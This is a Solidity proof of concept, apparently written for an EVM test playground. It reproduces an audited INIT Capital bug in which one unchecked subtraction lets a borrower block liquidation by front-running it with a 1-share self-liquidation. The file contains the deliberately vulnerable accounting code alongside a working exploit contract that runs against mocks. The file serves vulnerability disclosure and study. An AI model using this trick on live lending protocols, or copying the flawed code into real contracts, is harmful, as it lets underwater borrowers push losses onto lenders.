// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    INIT Capital — [H-01] Liquidations can be prevented by frontrunning and
    liquidating 1 debt (or more) due to wrong assumption in POS_MANAGER
    (code4rena 2023-12-initcapital, reporter 0x73696d616f, finding #29589)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    PosManager.updatePosDebtShares body is inlined VERBATIM (the wrong
    "debtAmtCurrent is always >= lastDebtAmt" assumption on line marked
    "@> VULN" below); the Exploit reproduces the exact real LendingPool
    round-up-on-repay ratio math (mulDiv, rounding UP — identical formulas to
    LendingPool.sol's debtShareToAmtStored/repay) so the off-by-one ratio drift
    that trips the underflow is REAL arithmetic, not a fudged number.

    Root cause: PosManager.updatePosDebtShares() computes
    `extraInfo.totalInterest += (debtAmtCurrent - extraInfo.lastDebtAmt)`
    assuming debtAmtCurrent (the position's CURRENT debt shares valued at the
    pool's LIVE totalDebt/totalDebtShares ratio) never decreases between calls.
    But a partial repay/liquidation shrinks the pool's totalDebtShares via
    round-UP repayment math, which can shift the ratio down just enough that
    the SAME position's remaining shares are worth 1 wei LESS than the
    snapshot taken moments earlier -> the subtraction underflows -> the call
    reverts. A borrower can therefore front-run any liquidation attempt with a
    trivial 1-share self-liquidation, permanently blocking the real
    (honest/protocol) liquidation call that follows -- evading liquidation
    while their position remains underwater, pushing the risk onto lenders.

    Time-based interest accrual (LendingPool.accrueInterest(), driven by
    block.timestamp) is replaced by an explicit accrueInterest(uint) call on
    the mock pool: a single no-cheatcode transaction cannot advance
    block.timestamp, but the EFFECT that matters for the bug -- totalDebt
    rising while totalDebtShares stays fixed -- is reproduced exactly. Every
    other formula (mulDiv round-UP on repay and on debtShareToAmtStored, the
    "first borrower" branch, the exact vulnerable subtraction) is unmodified
    real INIT Capital logic, and the resulting revert lands exactly 1 wei
    short, matching the INIT team's own diagnosis ("the shares will be worth
    1 less and it reverts").
//////////////////////////////////////////////////////////////////////////*/

/// @notice Minimal LendingPool exchange-rate mock. `borrow`/`repay`/
///         `debtShareToAmtStored` use the SAME round-UP mulDiv math as the
///         real LendingPool.sol (`_shares.mulDiv(totalDebt, totalDebtShares,
///         Rounding.Up)`), which is what produces the off-by-one ratio drift
///         the bug exploits. `accrueInterest(uint)` is an explicit stand-in
///         for the real time-driven `LendingPool.accrueInterest()` — same
///         effect (totalDebt grows, totalDebtShares doesn't), no wall clock.
contract MockLendingPool {
    uint public totalDebt;
    uint public totalDebtShares;

    /// @dev mirrors LendingPool.borrow(): first borrower gets shares == amt.
    function borrow(uint _amt) external returns (uint shares) {
        shares = totalDebt > 0 ? _mulDivUp(_amt, totalDebtShares, totalDebt) : _amt;
        totalDebtShares += shares;
        totalDebt += _amt;
    }

    /// @dev stand-in for LendingPool.accrueInterest() (time-based in the
    ///      original); same effect: totalDebt rises, totalDebtShares doesn't.
    function accrueInterest(uint _interest) external {
        totalDebt += _interest;
    }

    /// @dev verbatim ratio math from LendingPool.repay(): mulDiv round UP.
    function repay(uint _shares) external returns (uint amt) {
        amt = _mulDivUp(_shares, totalDebt, totalDebtShares);
        totalDebtShares -= _shares;
        totalDebt = totalDebt > amt ? totalDebt - amt : 0;
    }

    /// @notice verbatim ratio math from LendingPool.debtShareToAmtStored (mulDiv round UP)
    function debtShareToAmtStored(uint _shares) public view returns (uint amt) {
        amt = totalDebtShares > 0 ? _mulDivUp(_shares, totalDebt, totalDebtShares) : 0;
    }

    /// @notice mirrors LendingPool.debtShareToAmtCurrent (accrue-then-read);
    ///         accrual is the explicit accrueInterest() call above.
    function debtShareToAmtCurrent(uint _shares) external returns (uint amt) {
        amt = debtShareToAmtStored(_shares);
    }

    function _mulDivUp(uint a, uint b, uint c) internal pure returns (uint) {
        return (a * b + c - 1) / c;
    }
}

/// @notice Reduced INIT Capital PosManager holding ONLY the vulnerable
///         `updatePosDebtShares` accounting (PosManager.sol#L170-187).
contract PosManagerVuln {
    struct PosBorrExtraInfo {
        uint128 totalInterest;
        uint128 lastDebtAmt;
    }

    mapping(uint => mapping(address => uint)) public debtShares; // posId => pool => shares
    mapping(uint => mapping(address => PosBorrExtraInfo)) public borrExtraInfos;

    /// @dev Verbatim from PosManager.sol#updatePosDebtShares (SafeCast helpers
    ///      inlined as plain casts; ILendingPool -> MockLendingPool).
    function updatePosDebtShares(uint _posId, address _pool, int _deltaShares) external {
        uint currDebtShares = debtShares[_posId][_pool];
        uint debtAmtCurrent = MockLendingPool(_pool).debtShareToAmtCurrent(currDebtShares);
        PosBorrExtraInfo storage extraInfo = borrExtraInfos[_posId][_pool];
        // update interest accrued since last update
        // NOTE: debtAmtCurrent is always >= lastDebtAmt
        extraInfo.totalInterest += uint128(debtAmtCurrent - extraInfo.lastDebtAmt);
        // @> VULN: assumes debtAmtCurrent (this position's shares valued at the
        // pool's LIVE ratio) never drops below the lastDebtAmt snapshot taken in
        // a previous call. A prior partial repay/liquidation on this SAME
        // position moves the pool's totalDebt/totalDebtShares ratio (round-UP
        // repayment math), so the NEXT call's debtAmtCurrent for the (now
        // smaller) remaining shares can be 1 wei LESS than the snapshot ->
        // underflow -> revert. This blocks every future call to
        // updatePosDebtShares for the position (repay, borrow, AND liquidate),
        // letting the borrower dodge a real liquidation by front-running it
        // with a trivial 1-share self-liquidation.
        // FIX (INIT team's own mitigation): only add interest when
        // debtAmtCurrent > extraInfo.lastDebtAmt, i.e.
        //   if (debtAmtCurrent > extraInfo.lastDebtAmt) {
        //       extraInfo.totalInterest += (debtAmtCurrent - extraInfo.lastDebtAmt).toUint128();
        //   }
        uint newDebtShares = uint(int(currDebtShares) + _deltaShares);
        uint newDebtAmt = MockLendingPool(_pool).totalDebtShares() > 0
            ? MockLendingPool(_pool).debtShareToAmtStored(newDebtShares)
            : newDebtShares;
        debtShares[_posId][_pool] = newDebtShares;
        extraInfo.lastDebtAmt = uint128(newDebtAmt);
    }
}

/// @notice Orchestrates the exact InitCore call order for borrow/repay
///         (updatePosDebtShares BEFORE the pool-level borrow/repay, matching
///         InitCore.borrow() L142/144 and InitCore._repay() L545/547) so the
///         same real ordering produces the same real bug.
contract Exploit {
    MockLendingPool public pool;
    PosManagerVuln public posManager;
    uint public constant POS_ID = 1;
    bool public honestLiquidationReverted;

    constructor() {
        pool = new MockLendingPool();
        posManager = new PosManagerVuln();
    }

    function run() external {
        // 1. Borrow 1,000,000 (first borrower: shares == amt). Real InitCore.borrow()
        //    order: PosManager.updatePosDebtShares() runs BEFORE pool.borrow().
        posManager.updatePosDebtShares(POS_ID, address(pool), int(uint(1_000_000)));
        pool.borrow(1_000_000);

        // 2. 100,000 of interest accrues on the position's debt (10% of 1,000,000) —
        //    stand-in for `vm.warp(+1); pool.accrueInterest();` in the real PoC.
        pool.accrueInterest(100_000);

        // 3. Attacker FRONT-RUNS the incoming liquidation: self-liquidates 1 debt
        //    share. Real InitCore._repay() order: updatePosDebtShares() BEFORE pool.repay().
        posManager.updatePosDebtShares(POS_ID, address(pool), -int(uint(1)));
        pool.repay(1);

        // 4. The REAL (honest) liquidation attempt: repay the position's entire
        //    remaining 999,999 debt shares. This call MUST succeed for the
        //    protocol's liquidation mechanism to function.
        (bool ok,) = address(posManager).call(
            abi.encodeWithSelector(posManager.updatePosDebtShares.selector, POS_ID, address(pool), -int(uint(999_999)))
        );
        honestLiquidationReverted = !ok;

        // HARM: the honest liquidator's call reverted (underflow in the VULN
        // line above) — the position's 999,999 remaining debt shares are stuck
        // un-liquidatable through this path. The borrower evaded the real
        // liquidation by front-running it with a 1-share self-liquidation;
        // the underwater position's risk is now stuck on the protocol/lenders.
        require(honestLiquidationReverted, "harm not demonstrated: liquidation was NOT blocked");
        require(posManager.debtShares(POS_ID, address(pool)) == 999_999, "position should remain un-liquidated");
    }
}
